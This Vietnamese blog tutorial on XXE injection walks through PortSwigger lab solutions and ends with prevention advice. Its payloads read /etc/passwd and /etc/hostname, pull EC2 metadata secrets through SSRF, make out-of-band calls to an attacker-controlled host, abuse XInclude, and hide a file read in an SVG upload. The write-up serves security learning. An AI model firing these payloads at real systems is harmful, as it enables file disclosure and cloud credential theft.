---
layout: single
title: "XXE Injection - Tổng quan về lỗ hổng XML External Entity"
date: 2026-03-18
classes: wide
categories: [Penetration Testing]
tags: [xxe, xml, web-security, ssrf, blind-xxe, portswigger, owasp]
---
# XXE injection

I.Định nghĩa về lỗ hổng XXE

Trước khi vào sâu lỗ hổng thì đầu tiên mình muốn các bạn hiểu về khái niệm XML

Vậy XML có nghĩa là gì ?

Giống như HTML là hypertext markup language là hiển thị dữ liệu lên trình duyệt thì XML là XML là viết tắt của "extensible markup language" (ngôn ngữ đánh dấu mở rộng) dùng để lưu trữ và truyền tải dữ liệu , trong khi HTML là các thẻ cố định thì XML có thể tự định nghĩa thẻ . 

Vậy các thực thể XML là gì ? 

**XML entities** hoạt động giống như những "phím tắt" hoặc bí danh để thay thế các ký tự đặc biệt, giúp tài liệu XML không bị lỗi cấu trúc.

**1. Predefined Entities (Thực thể định nghĩa sẵn)**

Đây là những thực thể mặc định mà XML cung cấp để thay thế cho 5 ký tự đặc biệt có thể làm hỏng cấu trúc thẻ:

- `&lt;` đại diện cho `<` (Less than)
- `&gt;` đại diện cho `>` (Greater than)
- `&amp;` đại diện cho `&` (Ampersand)
- `&apos;` đại diện cho `'` (Apostrophe)
- `&quot;` đại diện cho `"` (Quotation mark)

**2. Internal Entities (Thực thể nội bộ)**

Bạn tự định nghĩa một cái tên để thay thế cho một đoạn văn bản dài hoặc lặp lại ngay trong chính tài liệu XML đó.

- **Cách khai báo (trong DTD):** `<!ENTITY copyright "Bản quyền thuộc về Công ty ABC">`
- **Cách dùng:** Khi bạn viết `&copyright;` trong nội dung, trình thông dịch sẽ tự động đổi nó thành "Bản quyền thuộc về Công ty ABc
    

**3. External Entities (Thực thể bên ngoài)**

Đây là loại "ghi chú" quan trọng nhất về bảo mật. Thay vì chứa giá trị cụ thể, nó **trỏ đến một nguồn dữ liệu khác** (tệp tin trên máy tính hoặc một đường link URL) bằng từ khóa `SYSTEM`. 

- **Cách khai báo:** `<!ENTITY tieu_chuan SYSTEM "https://example.com">`
- **Rủi ro bảo mật (XXE):** Nếu một kẻ tấn công gửi một đoạn mã XML có thực thể bên ngoài trỏ đến tệp hệ thống nhạy cảm (ví dụ: `file:///etc/passwd`), và phần mềm của bạn không chặn tính năng này, nó sẽ vô tình đọc và gửi nội dung tệp đó cho kẻ tấn công.

Vậy DTD là gì : 

**DTD (Document Type Definition)** là 1 khai báo xác định cấu trúc của một tài liệu XML, các loại giá trị mà nó có thể chứa và các mục khác. Nếu tài liệu XML là một "bài văn", thì DTD chính là "dàn ý bắt buộc" mà bạn phải tuân theo.

Nó quy định:

- Những thẻ (elements) nào được phép xuất hiện.
- Thẻ nào nằm trong thẻ nào (quan hệ cha - con).
- Các thẻ có thể chứa dữ liệu gì (chữ, số hay các thẻ khác).

DTD được khai báo trong `DOCTYPE`phần tử tùy chọn ở đầu tài liệu XML. DTD có thể hoàn toàn độc lập trong chính tài liệu (được gọi là "DTD nội bộ") hoặc có thể được tải từ nơi khác (được gọi là "DTD bên ngoài") hoặc có thể là sự kết hợp của cả hai
    
    
    

**Tại sao cần DTD?**

- **Thống nhất dữ liệu:** Đảm bảo mọi người (hoặc các phần mềm khác nhau) đều trình bày dữ liệu theo cùng một cấu trúc chuẩn.
- **Kiểm tra lỗi:** Trình thông dịch XML sẽ đối chiếu file XML của bạn với DTD. Nếu bạn viết sai thẻ hoặc thiếu thông tin bắt buộc, nó sẽ báo lỗi ngay lập tức.

II.Tấn công XXE

Lỗ hổng chèn các External enitiy XML hay còn gọi là XXE là 1 lỗ hổng mà cho phép kẻ tấn công can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng .Nó cho phép kẻ tấn công xem các tệp hệ thống của máy chủ  ứng dụng hoặc bất kỳ hệ thống bên ngoài nào mà ứng dụng có thể truy cập 

Trong một số trường hợp thì các attacker có thể lợi dụng XXE để RCE hoặc thực hiện các cuộc tấn công SSRF để có thể truy cập các hệ thống nội bộ

II. Tại sao lỗ hổng này lại xảy ra?

Bởi vì ứng dụng sử dụng định dạng XML để truyền dữ liệu từ client cho server , các webapp hầu như dùng thư viện chuẩn hoặc các API để xử lý dữ liệu XML trên máy chủ , lỗ hổng XXE phát sinh vì đặc tả XML chứa nhiều tính năng nguy hiểm và các trình phân tích cú pháp chuẩn hỗ trợ tính năng này ngay cả khi chúng thường ko được ứng dụng xử dụng 

Các external enities là 1 loại thực tế XML tùy chỉnh mà các giá trị được định nghĩa của chúng được tải từ bên ngoài DTD nơi chúng được khai báo 

III.Các loại tấn công XXE 

1. Khai thác lỗ hổng XXE để truy xuất tập tin , trong đó các thực thể bên ngoài được định nghĩa chứa nội dung của tập tin và được phản hồi trả về trogn ứng dụng

![/assets/images/xxe/image.png](/assets/images/xxe/image.png)

Bài lab đầu tiên: Phòng lab này có tính năng CheckStock và có phân tích dữ liệu đầu vào XML , và để giải quyết được bài thì ta phải chèn 1 thực thể bên ngoài XML để truy xuất nội dung của /etc/passwd/

Đầu tiên bật Burpsuite lên , click checkstock và intercept yêu cầu đó lại để có thể chỉnh sửa nội dung , 
Mục tiêu của mình là địa nghĩa 1 DTD xác định thực thể bên ngoài chữa đường dẫn tới tệp

Chỉnh sửa giá trị trong XML được trả về trong phản hồi của ứng dụng để sử dụng thực thể bên ngoài được định nghĩa 

![/assets/images/xxe/image.png](/assets/images/xxe/image 1.png)

Chúng ta thấy server trả về số lượng sản phẩm tồn kho , giờ đây mình sẽ thử định nghĩa 1 doctype 

```jsx
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
```

Và đồng thời thay product id bằng tham chiếu đến thực thể bên ngoài là &xxe 

và đây là kết quả trả về khi server báo lỗi là invalid product id nhưng kết quả của etc passwd thì trả về sau phản hồi đó

![/assets/images/xxe/image.png](/assets/images/xxe/image 2.png)

2. Khai thác lỗ hổng XXE dựa trên các cuộc tấn công SSRF 

Ngoài việc đánh cắp dữ liệu nhạy cảm thì XXE còn có thể khai thác bằng SSRF , các attacker sẽ có thể thực hiện các yêu cầu http request tới phía máy chủ ứng dụng truy cập vào bất kì url nào.

Để khai thác lỗ hổng XXE nhằm thực hiện vào SSRF , thì cũng tương tự như cách trên nhưng trong system chúng ta sẽ thực hiện trỏ tới 1 url trong nội bộ của ứng dụng 

![/assets/images/xxe/image.png](/assets/images/xxe/image 3.png)

Đây là bài lab thực hành số 2 : 
Đề bài yêu cầu chúng ta khai thác lỗi XXE bằng SSRF nhằm lấy được secret key từ metadata của EC2 

bài lab này dễ khi chúng ta đã biết được epoint của ec2 metadata là http:169.254.169.254

Tương tự như bài trên thì chúng ta cũng sẽ định nghĩa 1 cái DTD mà system chúng ta trỏ tới http:169.254.169.254

và sau đó thay product id bằng tham chiếu với external entities là &xxe;

![/assets/images/xxe/image.png](/assets/images/xxe/image 4.png)

Chúng ta đã thấy trong respone trả vè là invalid product id , và theo sau đó là latest ,1 phản hồi của endpoint metadata ,vì vậy mình sẽ cập nhật trong dtd bằng cách thêm latest để khám phá api để có xem được kết quả mong muốn 

![/assets/images/xxe/image.png](/assets/images/xxe/image 5.png)

Và sau khi mình dò hết thì đã tìm được endpojnt của metadata ec2, và sau đó nó đã trả về secret key nhưu đề bài yêu cầu 

![/assets/images/xxe/image.png](/assets/images/xxe/image 6.png)

3. Lỗ hổng XXE mù ( blind XXE)
    
    Cũng tương tự như blind sql , thì lỗ hổng xxe mù ko trả về bất kì thực thể bên ngoài nào được định nghĩa bên trong phản hồi của nó . Có nghĩa là  lỗ hổng phát sinh khi ứng dụng được khai thác bằng lỗ hổng XXE nhưng lại ko trả về giá trị của bất kì external entity nào được định nghĩa bên trong phản hồi của nó ,từ đó cũng rất khó cho chúng ta có thể truy xuất các tệp phía máy chủ 
    

Các lỗ hổng này thường cần các kỹ thuật tiên tiến hơn , có 2 cách chính để tìm ra lỗ hổng blind XXE 

- Tấn công bằng tương tác mạng ngoài luồng ( out of band network)
    
    Kỹ thuật cũng tương tự vấn XXE dựa trên SSRF ở trên , nhưng thay vì dùng URL của hệ thống nội bộ thì chúng ta thay bằng URL của 1 hệ thống mà chúng t có thể kiểm soát
    
    ví dụ : 
    
    ```jsx
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
    ```
    
    Sau đó , bạn có thể sử dụng thực thể đã tự định nghĩa vàtrong 1 giá trị trong XMl , cuộc tấn công này sẽ khiến máy chủ thực hiện http đến url được chỉ định , kẻ tấn công có thể theo dõi quá trình của dns lookup và các http request .
    
    ![/assets/images/xxe/image.png](/assets/images/xxe/image 7.png)
    
    Chúng ta có thể đến tới 1 bài lab ví dụ về cách tấn công XXE out of bands network , bởi vì bản burp suite của mình chỉ là bản thường nên mình sẽ xin phép demo lại các bước làm thay vì dùng burpsuite collaborator thì tôi sử dụng webhook.
    
    1. Truy cập vào [Webhook.site](https://webhook.site/).
    2. Bạn sẽ thấy một dòng gọi là **"Your unique URL"** (có dạng đại loại như `https://webhook.site/abcd-1234-...`).
    3. Hãy **Copy** địa chỉ này. Đừng đóng trình duyệt nhé, vì đây là nơi bạn sẽ coi kết quả trả về 
    
    ---
    
    Quay lại Burp Suite Community, tại tab **Repeater**, bạn sửa cái Request "Check stock" như sau:
    
    1. **Chèn DOCTYPE:** Thêm vào giữa dòng `<?xml...?>` và thẻ `<stockCheck>`.
    2. **Dán URL:** Thay cái URL của Webhook bạn vừa copy vào phần `SYSTEM`.
    
    Payload của bạn sẽ trông giống hệt thế này:
    
    XML
    
    `<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE stockCheck [ 
      <!ENTITY xxe SYSTEM "https://webhook.site/YOUR-UNIQUE-ID"> 
    ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>`
    
    > **Lưu ý:** Nhớ thay `YOUR-UNIQUE-ID` bằng mã riêng của bạn từ Webhook.site nhé.
    > 
    1. Nhấn **Send** trong Burp Suite.
    2. Bạn sẽ thấy Response của Server trả về lỗi hoặc không có gì đặc biệt (vì đây là Blind XXE mà).
    3. **Quan trọng nhất:** Quay lại tab trình duyệt đang mở **Webhook.site**.
    4. Nếu bài Lab thành công, bạn sẽ thấy một **Request mới** hiện lên ở cột bên trái.
        - Phần nội dung (Details) của request đó sẽ cho bạn biết IP của máy chủ Lab, các Header mà nó gửi tới...
        - Việc thấy request này xuất hiện chính là bằng chứng (Proof of Concept) rằng bạn đã điều khiển được Server của họ "gọi điện về nhà" cho bạn.
    
    Nhưng vì bài lab có thông báo to prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems…
    
    nên khi tôi dùng webhook thì đã bị tường lửa block lại , nên sương sương thì cách làm nó sẽ là như vậy
    

IV. Tìm các attack surface khác cho phép tiêm mã XXE 

Thông thường các lỗ hổng XXE thường khá rõ ràng trong nhiều trường hợp bởi vì đa số http request của ứng dụng chứa dữ liệu ở định dạng XML , nhưng trong các trường hợp ,bề mặt tấn công sẽ ít rõ ràng hơn và nếu bạn tìm kiếm đúng chỗ ,bạn sẽ thấy XXE trong các yêu cầu ko chứa bất kì XML nào 

a. Xinclude attack

Trước hết t cần phải hiểu rằng giao thức SOAP là gì ?

SOAP (Simple object access protocol) là 1 giao thức nhắn tin dựa trên XML ,cho phép các ứng dụng trên các hệ điều hành khác nhau giao tiếp qua mạng ,thường là HTTP .Nó cung cấp tiêu chuẩn bảo mật cao và chủ yếu dùng trong doanh nghiệp và ngân hàng.bởi vì SOAP tích hợp WS-security  cao hơn so với rest

SOAP vs REST

- SOAP : Chỉ dùng XML , cấu trúc chặt chẽ , bảo mật phù hợp cho các hệ thống enterphise
- REST : Hỗ trợ nhìu định dạng ( JSON , XML) ,linh hoạt, nhanh hơn web api hiện đại.

Một số ứng dụng nhận dữ liệu do máy khách gửi, nhúng dữ liệu đó vào một tài liệu XML ở phía máy chủ, rồi phân tích cú pháp tài liệu đó. Ví dụ, dữ liệu do máy khách gửi được đưa vào yêu cầu SOAP ở phía máy chủ, sau đó được xử lý bởi dịch vụ SOAP ở phía máy chủ.

Trong trường hợp này, bạn không thể thực hiện một cuộc tấn công XXE cổ điển, vì bạn không kiểm soát toàn bộ tài liệu XML và do đó không thể định nghĩa hoặc sửa đổi một `DOCTYPE`phần tử. Tuy nhiên, bạn có thể sử dụng `XInclude`thay thế. `XInclude`là một phần của đặc tả XML cho phép xây dựng tài liệu XML từ các tài liệu con. Bạn có thể đặt một `XInclude` vào bất kỳ giá trị dữ liệu nào trong tài liệu XML, vì vậy cuộc tấn công có thể được thực hiện trong các tình huống mà bạn chỉ kiểm soát một mục dữ liệu duy nhất được đặt trong tài liệu XML phía máy chủ.

Để thực hiện một `XInclude`  attack,bạn cần tham chiếu đến `XInclude`  namespace và cung cấp đường dẫn đến tệp mà bạn muốn đưa vào. Ví dụ:

```jsx
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

![/assets/images/xxe/image.png](/assets/images/xxe/image 8.png)

Thử lấy ví dụ cho bài thực hành này , bài thực hành yêu cầu chúng t hãy chèn Xinlucde để truy xuất nội dung của etc/passwd

Thì khi t intercept request post checkstock lên burpsuite thì chúng t ko còn thấy XML như các bài lab trước nữa ,nhưng vì chúng t đã biết chúng t có thể xử dụng XInlcude để có thể đọc file như yêu cầu đề bài nên bài nãy chúng t sẽ thay tham số product ID bằng 

![/assets/images/xxe/image.png](/assets/images/xxe/image 9.png)

```jsx
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Bởi vì t thấy bài chỉ accept content-type là urlendcode nên khi dán vào hãy nhwos mã hóa nớ ra như phía dưới và khi gửi bạn sẽ thấy được kết quả . Giải thích sơ về payload thì nó sẽ như thế này 

Dưới đây là giải thích từng phần của payload:

1. **`<foo ... > ... </foo>`**: Đây là một thẻ XML bao quanh (root element) tự chế. Vì bạn đang chèn nội dung vào một vị trí trung gian trong file XML của server, bạn cần một cặp thẻ để đóng gói payload của mình.
2. **`xmlns:xi="http://www.w3.org/2001/XInclude"`**: Đây là phần quan trọng nhất. Nó định nghĩa **Namespace** (không gian tên). Nó báo cho trình phân tích XML biết rằng tiền tố `xi:` sẽ tuân theo quy tắc của chuẩn **XInclude**. Nếu thiếu dòng này, server sẽ báo lỗi "prefix xi is not bound" (như bạn đã gặp).
3. **`<xi:include ... />`**: Đây là hàm "nhúng". Nó ra lệnh cho trình phân tích XML tìm một nguồn dữ liệu bên ngoài và chèn nội dung đó trực tiếp vào vị trí này.
4. **`parse="text"`**: Thuộc tính này yêu cầu server đọc tệp tin dưới dạng **văn bản thuần túy**. Điều này rất quan trọng vì nếu tệp `/etc/passwd` chứa các ký tự đặc biệt (như `<` hoặc `&`), nó sẽ không làm hỏng cấu trúc XML của server, giúp bạn đọc được nội dung mà không bị lỗi parser.
5. **`href="file:///etc/passwd"`**: Đây là đường dẫn đến tệp tin mục tiêu trên hệ thống Linux. Trình phân tích sẽ cố gắng đọc file này và trả kết quả về trong phản hồi (Response) của HTTP.

**Tóm lại:** Bạn đang lừa server "mượn" thư viện XInclude để đọc trộm file hệ thống và hiển thị nó ra màn hình cho bạn.

![/assets/images/xxe/image.png](/assets/images/xxe/image 10.png)

b. Tấn công XXE thông qua file upload

Một số ứng dụng cho phép tải lên tập tin và sau đó tập tin được xử lí ở phía máy chủ , một số định dạng tệp tin phổ biến sử dụng XML hoặc chứa các xml subcomponents. Ví dụ về định dạng dựa trên xml là các định dạng như docx hoặc các định dạng hình ảnh như svg

Tiếp theo là 1 bài demo về cách tấn công 

Để tạo một ảnh SVG nhằm khai thác lỗ hổng **XXE (XML External Entity)**, bạn không cần dùng đến các phần mềm đồ họa như Photoshop hay Illustrator. Vì SVG thực chất là một tệp văn bản dựa trên ngôn ngữ **XML**, bạn có thể tạo nó bằng bất kỳ trình soạn thảo văn bản nào (như Notepad, VS Code, Sublime Text, hoặc Nano).

Dưới đây là các bước chi tiết và giải thích cấu trúc mã:

![/assets/images/xxe/image.png](/assets/images/xxe/image 11.png)

### 1. Cách tạo tệp tin

1. Mở một trình soạn thảo văn bản trên máy tính của bạn.
2. Sao chép và dán đoạn mã dưới đây vào:

```jsx
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

1. Lưu tệp với file mở rộng là svg

- **Tải lên (Upload):** Truy cập vào mục bình luận của blog trong bài Lab. Nhập tên, email và chọn tệp `exploit.svg` để làm ảnh đại diện (Avatar).
- **Kích hoạt (Trigger):** Gửi bình luận. Lúc này, máy chủ sẽ nhận tệp, thư viện Apache Batik sẽ phân tích XML bên trong và vô tình thực hiện lệnh đọc file mà mình đã cài
- **Thu thập kết quả:** Quay lại trang danh sách bình luận. Bạn sẽ thấy ảnh đại diện của mình không phải là một hình vẽ bình thường, mà là một dòng chữ nhỏ. Đó chính là **hostname** của máy chủ mục tiêu.
- 

![/assets/images/xxe/image.png](/assets/images/xxe/image 12.png)

Mở to hình ảnh trong tab mới để có thể dễ thấy được kết quả , lấy kết quả đó submit thì sẽ được

II. Cách tìm và kiểm tra các lỗ hổng XXE 

Đa số các lỗ hổng XXE có thể được phát triển nhanh chóng và đáng tin cậy bằng cách sử dụng công cụ quét lỗ hổng web bằng BS

- Kiểm tra khả năng truy xuất tập tin là gì bằng cách định nghĩa một thực thể bên ngoài dựa trên một tập tin hệ điều hành quen thuộc và sử dụng thực thể đó trong dữ liệu được trả về trong phản hồi của ứng dụng.
- Kiểm tra blind XXE là gì bằng cách định nghĩa một thực thể bên ngoài dựa trên URL đến một hệ thống mà bạn kiểm soát, và giám sát các tương tác với hệ thống.
- Kiểm tra khả năng chèn dữ liệu không phải XML do người dùng cung cấp vào tài liệu XML phía máy chủ bằng cách sử dụng [tấn công XInclude](https://portswigger.net/web-security/xxe#xinclude-attacks) để cố gắng truy xuất một tệp hệ điều hành quen thuộc

V. Cách phòng ngừa tấn công XXE 

Hầu hết các lỗ hổng XXE đều phát sinh do thư viện phân tích cú pháp XML của ứng dụng hỗ trợ các tính năng XML tiềm ẩn nguy hiểm mà ứng dụng không cần hoặc không có ý định sử dụng. Cách dễ nhất và hiệu quả nhất để ngăn chặn các cuộc tấn công XXE là vô hiệu hóa các tính năng đó. 

-Có nghĩa là vô hiệu hóa DTD 

**Ví dụ trong Java:** Bạn có thể sử dụng phương thức `setFeature` của `DocumentBuilderFactory` để tắt DTD

```jsx
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

```

- Tắt thực thể bên ngoài : Nếu tường hợp ứng dụng xử dụng DTD ,hãy cấu hienhf bộ phân tích XML  để không xử lí các thực thể bên ngoài và các thực thể tham số
- Luôn kiểm tra và làm sạch dữ liệu đầu vào


